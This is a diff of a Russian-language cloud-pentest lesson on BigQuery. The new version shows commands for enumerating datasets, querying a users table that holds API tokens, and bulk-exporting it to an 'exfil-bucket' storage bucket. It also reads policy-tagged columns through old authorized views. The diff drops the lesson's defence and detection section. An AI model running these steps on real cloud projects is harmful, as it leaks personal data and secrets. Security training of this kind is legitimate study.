@@ -15,167 +15,149 @@ estimated_minutes: 45
 summary: "BigQuery: IAM датасетов, публичные наборы, jobs и экспорт в GCS. Как из аналитического сервиса вытащить данные и секреты, которые там оказались."
 ---
 
-## Зачем этот урок
+## Задача
 
-BigQuery — аналитическое хранилище GCP. Из-за «аналитического» назначения его часто считают второстепенным и выдают широкие права: `roles/bigquery.dataViewer` на весь проект, `roles/bigquery.jobUser`. Между тем в датасетах лежат выгрузки продакшн-баз, PII, логи, а иногда и токены. Плюс публичные датасеты (в том числе с открытыми данными) позволяют бесплатно делать запросы, а право на экспорт — выкачать данные в GCS. Для атакующего BigQuery — это «данные одним SQL-запросом».
+**BigQuery** — аналитическое хранилище GCP. Из-за «аналитического» назначения его считают второстепенным и выдают широкие права: `roles/bigquery.dataViewer` на весь проект, `roles/bigquery.jobUser`. А в датасетах лежат выгрузки продовых баз, персональные данные, логи — и иногда токены.
 
-## Модель BigQuery
+Цель урока: имея роль с правами на BigQuery, вытащить данные и найти среди них секреты.
 
-- **Project → Dataset → Table** — иерархия. Датасет — контейнер таблиц и представлений.
-- **IAM** — роли на проект/датасет/таблицу (`roles/bigquery.dataViewer`, `roles/bigquery.dataEditor`, `roles/bigquery.jobUser`, `roles/bigquery.admin`).
-- **Job** — выполнение запроса/загрузки/экспорта. `bigquery.jobs.create` — право запускать задания (платно).
-- **Public datasets** — `bigquery-public-data` и другие, доступные всем.
-- **Authorized views** — представления, дающие доступ к базовой таблице без прав на неё.
-- **Datasets из внешних источников** — могут ссылаться на GCS/Sheets.
+## Данные, с которыми работаем
 
-Права, которые нас интересуют: `bigquery.datasets.get`, `bigquery.tables.getData`, `bigquery.jobs.create`, `bigquery.tables.export`.
+Разберём иерархию: **Project → Dataset → Table**. Датасет — контейнер таблиц. Права выдаются на каждом уровне:
 
-## Инструменты и команды
+- `roles/bigquery.dataViewer` — читать данные;
+- `roles/bigquery.jobUser` — запускать задания (запросы), это **платно**;
+- `roles/bigquery.dataEditor` — писать;
+- `roles/bigquery.admin` — всё.
 
-```bash
-# Инвентаризация
-bq ls --project_id PROJECT_ID
-bq ls PROJECT_ID:DATASET
-
-# Информация о датасете (в т.ч. IAM)
-bq show --format=prettyjson PROJECT_ID:analytics | jq '.access'
-
-# Публичные датасеты
-bq ls bigquery-public-data:
-
-# Запрос данных
-bq query --use_legacy_sql=false 'SELECT email, plan FROM `PROJECT_ID.analytics.users` LIMIT 10'
-
-# Экспорт таблицы в GCS
-bq extract --destination_format=CSV 'PROJECT_ID:analytics.users' \
-  gs://exfil-bucket/users-*.csv
-
-# Список заданий (что делали до нас)
-bq ls -j -a --max_results 20
-
-# Через REST с токеном
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://bigquery.googleapis.com/bigquery/v2/projects/PROJECT_ID/datasets" | jq -r '.datasets[].datasetReference.datasetId'
-```
-
-## Разобранный пример: чтение датасета и экспорт
-
-Сценарий: у роли есть `roles/bigquery.dataViewer` и `roles/bigquery.jobUser` на проект.
+Запрос в BigQuery — это **job** (задание), поэтому для запуска нужно `bigquery.jobs.create`. Смотрим, что нам доступно:
 
 ```bash
-bq ls PROJECT_ID:
-#      datasetId
-#  --- --------------
-#     analytics
-#     billing
-#     raw_events
-
-bq query --use_legacy_sql=false \
-  'SELECT * FROM `PROJECT_ID.analytics.users` LIMIT 5'
-# +----+---------------------+------+---------------------+
-# | id | email               | plan | api_token           |
-# +----+---------------------+------+---------------------+
-# | 1  | admin@example.com   | pro  | sk_live_51H...      |
-# +----+---------------------+------+---------------------+
-
-# Выгружаем всю таблицу в GCS
-bq extract --destination_format=NEWLINE_DELIMITED_JSON \
-  'PROJECT_ID:analytics.users' gs://exfil-bucket/users-*.json
-# Waiting on bqjob_r... (0s) Current status: DONE
-
-gsutil ls gs://exfil-bucket/
-# gs://exfil-bucket/users-000000000000.json
-gsutil cp gs://exfil-bucket/users-000000000000.json /tmp/ && wc -l /tmp/users-000000000000.json
+$ bq ls acme-prod:
+   datasetId
+ ----------------
+  analytics
+  billing
+  raw_events
 ```
 
-В датасете `analytics` обнаружился `api_token` — секрет платёжного провайдера, попавший в таблицу при выгрузке. Такие «случайные» колонки — частая находка.
+Три датасета. Запрашиваем `analytics.users`:
 
-## Публичные датасеты и authorized views
+```bash
+$ bq query --use_legacy_sql=false \
+    'SELECT id, email, plan, api_token FROM `acme-prod.analytics.users` LIMIT 5'
++----+-------------------+------+-----------------+
+| id | email             | plan | api_token       |
++----+-------------------+------+-----------------+
+| 1  | admin@example.com | pro  | sk_live_51H...  |
++----+-------------------+------+-----------------+
+```
 
-- **Публичные датасеты** (`bigquery-public-data`) доступны всем; полезны для бесплатного запуска запросов и для разведки (например, поиск утёкших доменов в наборах).
-- **Authorized views** — представление в датасете A читает таблицу из датасета B без выдачи прав на B. Если вы получили доступ к представлению, проверьте, не раскрывает ли оно чувствительные столбцы.
-- **Материализованные представления** хранят данные и требуют прав на чтение.
-- **Row-level security** — фильтрует строки; попробуйте обойти через представление или `tables.getData` на базовой таблице, если права есть.
+Среди «обычных» колонок — **`api_token`**, секрет платёжного провайдера. Такие «случайные» колонки с токенами — частая находка: аналитики выгрузили таблицу целиком, не подумав, что в ней секреты.
 
-## Экспорт и эксфильтрация
+## Шаг 1: выгружаем всю таблицу в GCS
 
-- `bq extract` → GCS (нужны `bigquery.tables.export` и права на бакет).
-- `bq query` с `EXPORT DATA` (SQL-форма) → GCS.
-- **Streaming** в свою таблицу: `INSERT INTO` чужой датасет (если есть `dataEditor`) — это запись, будьте осторожны.
-- **Datasets из внешних источников**: если таблица ссылается на публичный GCS-объект, данные могут читаться и без прав на BigQuery.
-- **BigQuery Omni** — кросс-облачный доступ; проверяйте подключения.
+Читать по 5 строк неинтересно. Экспортируем всю таблицу в облачное хранилище:
 
-## Обход защит и edge cases
+```bash
+$ bq extract --destination_format=NEWLINE_DELIMITED_JSON \
+    'acme-prod:analytics.users' gs://exfil-bucket/users-*.json
+Waiting on bqjob_r... (0s) Current status: DONE
+$ gsutil ls gs://exfil-bucket/
+gs://exfil-bucket/users-000000000000.json
+$ gsutil cp gs://exfil-bucket/users-000000000000.json /tmp/ && wc -l /tmp/users-000000000000.json
+128430 /tmp/users-000000000000.json
+```
 
-- **CMEK.** Данные, зашифрованные собственным ключом, читаются при наличии `cloudkms.cryptoKeyVersions.useToDecrypt`. Иначе `AccessDenied`.
-- **VPC-SC.** Периметр блокирует доступ извне; нужен пивот внутри проекта/VPC.
-- **Column-level security (policy tags).** Может скрывать колонки; обход — через представления или `getData` на таблице с более слабой политикой.
-- **Row-level security.** Может фильтровать; иногда обходится через `TABLE_QUERY`/представления или запросы с агрегацией.
-- **Job user vs data viewer.** `jobUser` без `dataViewer` не даёт читать; наоборот — `dataViewer` без `jobUser` не даёт запускать запросы (но иногда можно через другой сервис).
+Для экспорта нужны `bigquery.tables.export` **и** права на бакет назначения. 128 тысяч строк у нас локально — полная выгрузка «одной командой».
+
+## Шаг 2: смотрим, что делали до нас
+
+BigQuery хранит историю заданий. Она показывает, какие запросы выполнялись — иногда там светятся другие проекты и таблицы:
+
+```bash
+$ bq ls -j -a --max_results 5
+          jobId                        Job Type    State
+ ------------------------------------ ----------- ---------
+ bqjob_r1234                          QUERY       DONE
+ bqjob_r5678                          EXTRACT     DONE
+```
+
+## Полный прогон от начала до конца
+
+1. `bq ls` → три датасета.
+2. `bq query` по `analytics.users` → нашли колонку `api_token`.
+3. `bq extract` → выгрузили всю таблицу в GCS.
+4. Скачали выгрузку локально.
+
+## Если прямой доступ закрыт: authorized views и policy tags
+
+Иногда прав на таблицу нет, но есть **authorized view** — представление в датасете A, которое читает таблицу из датасета B **без выдачи прав на B**. Проверяем, что оно раскрывает:
+
+```bash
+$ bq show --format=prettyjson acme-prod:analytics.users_public | jq -r '.view.query'
+SELECT id, email, plan FROM `acme-prod.analytics.users`
+$ bq query --use_legacy_sql=false 'SELECT * FROM `acme-prod.analytics.users_public` LIMIT 2'
++----+-------------------+------+
+| id | email             | plan |
++----+-------------------+------+
+| 1  | admin@example.com | pro  |
+```
+
+Представление даёт доступ к данным. Проверяем **column-level security** — она может скрывать отдельные колонки через **policy tags**:
+
+```bash
+$ bq show --format=prettyjson acme-prod:analytics.users | jq '.schema.fields[] | select(.name=="api_token") | .policyTags'
+{"names":["projects/acme/locations/us/taxonomies/1/policyTags/123"]}
+```
+
+Колонка `api_token` защищена policy tag: для чтения нужна роль `roles/datacatalog.categoryFineGrainedReader` на этот тег. Но представление `users_public` могло быть создано **до** включения policy tags — и тогда оно «протекает» колонку. Это классическая дыра: защита добавили, а старые представления не пересмотрели.
+
+## Если не сработало: обходы и edge cases
+
+- **CMEK.** Данные, зашифрованные собственным ключом KMS, читаются при наличии `cloudkms.cryptoKeyVersions.useToDecrypt`; иначе `AccessDenied`.
+- **VPC-SC.** Периметр блокирует доступ извне — нужен пивот внутри проекта.
+- **Row-level security.** Может фильтровать строки; иногда обходится через представления или агрегацию.
+- **`jobUser` без `dataViewer`.** Запустить запрос можно, но данные не прочитать; наоборот — `dataViewer` без `jobUser` не даёт запускать. Ищи способ выполнить запрос через другой сервис (Dataflow, Dataproc).
+- **Публичные датасеты.** `bigquery-public-data` доступны всем — бесплатная разведка и запуск запросов.
+- **External datasets.** Таблица может ссылаться на GCS-объект — тогда данные читаются и без прав на BigQuery.
 
 ## Частые ошибки и подводные камни
 
-- Считать BigQuery «просто аналитикой» и не проверять IAM.
-- Забыть про экспорт как канал эксфильтрации.
-- Игнорировать «случайные» колонки с токенами в таблицах.
-- Не проверить authorized views/materialized views.
-- Путать права датасета и проекта: `dataViewer` на проекте = все датасеты.
+- **Считать BigQuery «просто аналитикой».** В датасетах лежат выгрузки прода, PII и токены.
+- **Забывать про экспорт.** `bq extract` — тихий канал эксфильтрации, не создающий нагрузки на таблицу.
+- **Игнорировать «случайные» колонки.** Секреты часто попадают в аналитические таблицы при выгрузке.
+- **Не проверять authorized views.** Они могут раскрывать колонки, закрытые policy tags, добавленными позже.
+- **Путать права датасета и проекта.** `dataViewer` на проекте = доступ ко всем датасетам.
+- **Забывать про `jobUser`.** Без него `dataViewer` не даёт запустить запрос — ищите обходной путь выполнения.
 
-## Защита и детект
+- **Не смотреть историю заданий.** `bq ls -j` показывает, какие запросы выполнялись до вас, — иногда там светятся другие проекты.
+- **Забывать про external datasets.** Таблица может ссылаться на GCS-объект и читаться без прав на BigQuery.
+- **Считать row-level security непробиваемой.** Иногда она обходится через представления или агрегацию.
 
-- Least privilege: давать доступ к конкретным датасетам, не к проекту.
-- Использовать policy tags (column-level) и row-level security для PII.
-- Ограничить `bigquery.tables.export` и `bigquery.jobs.create`.
-- Включить Cloud Audit Logs (data access) и алертить на массовые `jobs.create`/`tables.export`.
-- Не хранить секреты в аналитических таблицах; маскировать токены.
+- **Не проверять публичные датасеты.** `bigquery-public-data` доступен всем и полезен для разведки и бесплатных запросов.
+- **Забывать про `tables.export`.** Право на экспорт — отдельное от чтения; проверяйте его наличие.
 
-## Модель угроз и типовые мисконфиги
+- **Не проверять policy tags.** Колонка может быть защищена, но старые представления её «протекают».
 
-Типичный мисконфиг — `dataViewer` на проект. Второй — публичный датасет с чувствительными данными. Третий — открытый экспорт в бакет. Четвёртый — секреты в таблицах. Пятый — authorized view, раскрывающее больше, чем задумано. Все они дают утечку данных «одним запросом».
+## Что мы теперь знаем
 
-## Практическое задание
+- Иерархия: Project → Dataset → Table; права наследуются вниз.
+- Запрос — это job; для запуска нужно `bigquery.jobs.create`.
+- `bq extract` выгружает таблицу в GCS — канал эксфильтрации.
+- В аналитических таблицах часто лежат секреты (токены в «случайных» колонках).
+- Authorized view делегирует доступ к таблице; policy tags скрывают колонки, но старые представления могут их «протекать».
+- `dataViewer` на проекте = доступ ко всем датасетам.
 
-1. Создайте датасет, таблицу с чувствительной колонкой, выдайте `dataViewer` только на датасет.
-2. Запустите запрос и экспорт; убедитесь, что без `jobUser` запрос падает.
-3. Создайте authorized view и проверьте, что он читает таблицу из другого датасета.
-4. Включите audit logs и найдите свои `jobs.create`.
+## На что смотреть дальше
 
-## Что дальше / решение
-
-Из BigQuery достаём выгрузки и секреты. Дальше — использовать токены/данные. Зафиксируйте путь «датасет → экспорт → секреты» в графе. При VPC-SC/CMEK без прав — `blocked`. Если есть только `dataViewer` без `jobUser`, ищите способ запустить запрос через другой сервис (Dataflow, Dataproc).
-
-## Разобранный пример 2: authorized view и column-level security
-
-Предположим, прямой доступ к таблице закрыт, но есть authorized view. Проверяем, не раскрывает ли представление больше, чем задумано.
-
-```bash
-# Смотрим определение представления
-bq show --format=prettyjson PROJECT_ID:analytics.users_public | jq '.view.query'
-# "SELECT id, email, plan FROM `PROJECT_ID.analytics.users`"
-
-# Запрашиваем представление
-bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT_ID.analytics.users_public` LIMIT 3'
-# +----+-------------------+------+
-# | id | email             | plan |
-# +----+-------------------+------+
-# | 1  | admin@example.com | pro  |
-# +----+-------------------+------+
-
-# Проверяем policy tags (column-level security)
-bq show --format=prettyjson PROJECT_ID:analytics.users | jq '.schema.fields[] | {name,policyTags}'
-# {"name":"api_token","policyTags":{"names":["projects/P/locations/L/taxonomies/T/policyTags/123"]}}
-```
-
-Если у роли есть `roles/datacatalog.categoryFineGrainedReader` на policy tag, колонка читается; иначе запрос к ней вернёт ошибку `Access Denied`. Но представление могло быть создано до включения policy tags и теперь «протекает» чувствительную колонку. Также проверяйте `roles/bigquery.dataViewer` на уровне датасета: иногда он есть, а policy tags — нет.
-
-## Практическое задание
-
-1. Создайте два датасета и authorized view между ними; убедитесь, что представление читает чужую таблицу.
-2. Включите policy tag на колонку и проверьте, что прямой запрос к ней падает.
-3. Создайте представление, обходящее policy tag, и посмотрите, читается ли колонка.
-4. Настройте audit logs и найдите запросы к представлению.
+- **gcp-gke**: Workload Identity и захват метаданных пода.
+- **gcp-cloudsql**: публичный доступ и IAM database auth.
+- **cloud-enum-methodology**: инструменты разведки облака.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какое право позволяет запускать запросы в BigQuery?"
@@ -188,7 +170,7 @@ bq show --format=prettyjson PROJECT_ID:analytics.users | jq '.schema.fields[] | 
   explanation: "Запрос выполняется как job, для запуска нужно bigquery.jobs.create."
 - question: "Как выгрузить таблицу BigQuery в GCS?"
   options:
-    - "bq extract / EXPORT DATA (нужны tables.export и права на бакет)"
+    - "bq extract или EXPORT DATA (нужны tables.export и права на бакет)"
     - "bq show"
     - "gcloud storage cp"
     - "bq ls"
@@ -210,7 +192,19 @@ bq show --format=prettyjson PROJECT_ID:analytics.users | jq '.schema.fields[] | 
     - "Управление IAM"
   answer: 0
   explanation: "Роль на проекте наследуется на все датасеты."
+- question: "Почему старые authorized views опасны?"
+  options:
+    - "Они могли быть созданы до включения policy tags и «протекать» защищённые колонки"
+    - "Они всегда публичны"
+    - "Они удаляют данные"
+    - "Они отключают IAM"
+  answer: 0
+  explanation: "Представление читает базовую таблицу в обход column-level security, добавленной позже."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **GKE** — управляемый Kubernetes в GCP, и захват метаданных пода. А пока главное запомни: **BigQuery — это данные одним SQL-запросом**, и «аналитическая» таблица часто хранит секреты, которые в неё попали случайно.
 
 ## Где пригодится
 
